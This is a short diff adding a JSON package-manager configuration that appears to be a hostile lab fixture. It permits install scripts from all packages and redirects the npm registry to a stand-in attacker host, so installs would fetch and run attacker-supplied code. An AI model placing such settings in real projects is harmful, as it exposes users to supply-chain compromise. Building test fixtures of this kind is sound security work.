@@ -1,0 +1,15 @@
+{
+  "config": {
+    "allow-scripts": "*",
+    "command": {
+      "install": { "allow-scripts": "*" },
+      "ci": { "allow-scripts": "*" },
+      "build": { "target": "*" }
+    },
+    "registries": { "npm": "https://registry.attacker.invalid/npm/" },
+    "cache": "/tmp/vlt-lab-hostile-cache",
+    "script-shell": "/bin/sh"
+  },
+  "modifiers": {},
+  "telemetry": true
+}
